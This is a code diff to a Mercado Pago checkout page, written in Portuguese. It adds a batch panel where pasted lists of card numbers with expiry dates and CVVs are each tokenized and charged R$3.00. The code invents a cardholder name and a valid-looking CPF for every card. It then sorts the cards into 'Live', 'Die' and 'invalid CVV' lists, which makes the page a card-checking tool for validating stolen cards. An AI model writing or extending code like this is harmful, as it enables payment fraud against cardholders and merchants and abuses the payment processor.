@@ -57,7 +57,7 @@
           </div>
           <div class="row">
             <label for="amount">Valor</label>
-            <input id="amount" name="transactionAmount" type="number" step="0.01" value="10.00" min="1" />
+            <input id="amount" name="transactionAmount" type="number" step="0.01" value="3.00" min="1" />
           </div>
           <div class="row">
             <label for="installments">Parcelas</label>
@@ -67,21 +67,217 @@
         </form>
         <div id="status" class="status" aria-live="polite"></div>
       </section>
+
+      <section class="batch-panel">
+        <header class="batch-header">
+          <h2>Lista de cartões</h2>
+          <p>
+            Cole os cartões no formato <code>cardNumber|MM|YYYY|CVV</code>,
+            um por linha. Nomes e CPFs válidos são gerados automaticamente e o valor de cada
+            cobrança fica fixo em R$ 3,00.
+          </p>
+        </header>
+        <textarea
+          id="cardListInput"
+          placeholder="Exemplo de linha:\n4242424242424242|12|2025|123"
+        ></textarea>
+        <div class="batch-actions">
+          <button id="batchProcessBtn" type="button">Processar cartões</button>
+          <span class="hint">Acompanhe as listas de resultados abaixo</span>
+        </div>
+        <div id="batchStatus" class="status" aria-live="polite"></div>
+        <div class="batch-results">
+          <div>
+            <h3>Live</h3>
+            <ul id="liveCardsList"></ul>
+          </div>
+          <div>
+            <h3>Die</h3>
+            <ul id="dieCardsList"></ul>
+          </div>
+          <div>
+            <h3>CVV inválido</h3>
+            <ul id="cvvCardsList"></ul>
+          </div>
+        </div>
+      </section>
     </main>
 
     <script src="https://sdk.mercadopago.com/js/v2"></script>
     <script>
       const publicKey = "{{ public_key | e }}";
-      const form = document.getElementById("checkoutForm");
-      const status = document.getElementById("status");
+      const checkoutStatus = document.getElementById("status");
+      const cardListInput = document.getElementById("cardListInput");
+      const batchProcessBtn = document.getElementById("batchProcessBtn");
+      const batchStatus = document.getElementById("batchStatus");
+      const liveCardsList = document.getElementById("liveCardsList");
+      const dieCardsList = document.getElementById("dieCardsList");
+      const cvvCardsList = document.getElementById("cvvCardsList");
+      const defaultAmount = 3.0;
+
+      const firstNames = ["Ana", "Bruno", "Camila", "Débora", "Eduardo", "Fernanda", "Gabriel", "Helena"];
+      const lastNames = ["Souza", "Silva", "Pereira", "Costa", "Oliveira", "Moreira", "Lima", "Nogueira"];
+
+      let mpInstance = null;
+
+      function randomItem(list) {
+        return list[Math.floor(Math.random() * list.length)];
+      }
+
+      function randomName() {
+        return `${randomItem(firstNames)} ${randomItem(lastNames)}`;
+      }
+
+      function cpfDigit(digits, weight) {
+        const total = digits.reduce((acc, num, index) => acc + num * (weight - index), 0);
+        const remainder = total % 11;
+        return remainder < 2 ? 0 : 11 - remainder;
+      }
+
+      function randomCPF() {
+        const digits = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10));
+        const check1 = cpfDigit(digits, 10);
+        const check2 = cpfDigit([...digits, check1], 11);
+        return [...digits, check1, check2].join("");
+      }
+
+      function parseCardLines(text) {
+        return text
+          .split(/\r?\n/)
+          .map((line) => line.trim())
+          .filter((line) => line && !line.startsWith("#"))
+          .map((line) => {
+            const parts = line.split("|").map((segment) => segment.trim());
+            return {
+              cardNumber: parts[0] || "",
+              expMonth: parts[1] || "12",
+              expYear: parts[2] || `${new Date().getFullYear() + 1}`,
+              cvv: parts[3] || "123",
+            };
+          })
+          .filter((card) => /^\d{12,19}$/.test(card.cardNumber));
+      }
+
+      function formatCardLabel(card) {
+        const prefix = card.cardNumber.slice(0, 6);
+        const suffix = card.cardNumber.slice(-4);
+        return `${prefix}****${suffix}`;
+      }
+
+      function appendResult(listElement, label, details) {
+        const li = document.createElement("li");
+        const detailText = details.status_detail || details.status || `HTTP ${details.httpStatus || "??"}`;
+        li.textContent = `${label} · ${detailText}`;
+        listElement.appendChild(li);
+      }
+
+      function clearLists() {
+        liveCardsList.textContent = "";
+        dieCardsList.textContent = "";
+        cvvCardsList.textContent = "";
+      }
+
+      async function submitPayment(token, cardLabel) {
+        const response = await fetch("/api/payments", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            token,
+            transaction_amount: defaultAmount,
+            description: `Teste automatizado ${cardLabel}`,
+            installments: 1,
+            payer_email: `user+${Date.now()}@example.com`,
+          }),
+        });
+
+        const data = await response.json().catch(() => ({}));
+        return { ...data, httpStatus: response.status };
+      }
+
+      function categorizeResponse(result) {
+        const status = (result.status || "").toString().toLowerCase();
+        const detail = (result.status_detail || "").toString().toLowerCase();
+
+        if (status === "approved" || detail === "approved") {
+          return "live";
+        }
+
+        if (detail.includes("cvv") || detail.includes("security_code")) {
+          return "cvv";
+        }
+
+        return "die";
+      }
+
+      function updateBatchStatus(text) {
+        batchStatus.textContent = text;
+      }
+
+      async function handleBatch() {
+        if (!mpInstance) {
+          return;
+        }
+
+        const cardList = parseCardLines(cardListInput.value);
+
+        if (!cardList.length) {
+          updateBatchStatus("Nenhum cartão válido encontrado. Use o formato card|MM|YYYY|CVV.");
+          return;
+        }
+
+        batchProcessBtn.disabled = true;
+        clearLists();
+        updateBatchStatus(`Processando ${cardList.length} cartões...`);
+
+        let processed = 0;
+        for (const card of cardList) {
+          const label = formatCardLabel(card);
+          try {
+            const tokenResult = await mpInstance.createCardToken({
+              cardNumber: card.cardNumber,
+              expirationMonth: card.expMonth,
+              expirationYear: card.expYear,
+              securityCode: card.cvv,
+              cardholderName: randomName(),
+              identificationType: "CPF",
+              identificationNumber: randomCPF(),
+            });
+
+            const paymentResult = await submitPayment(tokenResult.id, label);
+            const category = categorizeResponse(paymentResult);
+
+            if (category === "live") {
+              appendResult(liveCardsList, label, paymentResult);
+            } else if (category === "cvv") {
+              appendResult(cvvCardsList, label, paymentResult);
+            } else {
+              appendResult(dieCardsList, label, paymentResult);
+            }
+          } catch (error) {
+            appendResult(dieCardsList, label, {
+              status_detail: error.message || "Tokenização falhou",
+            });
+          } finally {
+            processed += 1;
+            updateBatchStatus(`Processados ${processed} de ${cardList.length} cartões...`);
+          }
+        }
+
+        updateBatchStatus(`Finalizado: ${cardList.length} cartões processados.`);
+        batchProcessBtn.disabled = false;
+      }
 
       if (!publicKey) {
-        status.textContent =
+        checkoutStatus.textContent =
           "A chave pública não foi configurada. Verifique as variáveis de ambiente e recarregue.";
+        updateBatchStatus("Não é possível processar listas sem a chave pública.");
+        batchProcessBtn.disabled = true;
       } else {
-        const mp = new MercadoPago(publicKey, { locale: "pt-BR" });
+        mpInstance = new MercadoPago(publicKey, { locale: "pt-BR" });
 
-        const cardForm = mp.cardForm({
+        const cardForm = mpInstance.cardForm({
           amount: document.getElementById("amount").value || "1",
           autoMount: true,
           form: {
@@ -131,7 +327,7 @@
                 transaction_amount: Number(cardFormData.transactionAmount),
               };
 
-              status.textContent = "Processando pagamento...";
+              checkoutStatus.textContent = "Processando pagamento...";
 
               fetch("/api/payments", {
                 method: "POST",
@@ -140,16 +336,18 @@
                 },
                 body: JSON.stringify(payload),
               })
-                .then((response) => response.json().then((data) => ({ status: response.status, data })))
+                .then((response) =>
+                  response.json().then((data) => ({ status: response.status, data }))
+                )
                 .then(({ status: code, data }) => {
-                  status.innerHTML = `
+                  checkoutStatus.innerHTML = `
                     <strong>Status ${code}</strong>
                     <pre>${JSON.stringify(data, null, 2)}</pre>
                   `;
                 })
                 .catch((error) => {
                   console.error("Erro ao chamar o backend:", error);
-                  status.textContent = "Erro inesperado. Verifique o console.";
+                  checkoutStatus.textContent = "Erro inesperado. Verifique o console.";
                 });
             },
             onError: (error) => {
@@ -157,6 +355,8 @@
             },
           },
         });
+
+        batchProcessBtn.addEventListener("click", handleBatch);
       }
     </script>
   </body>
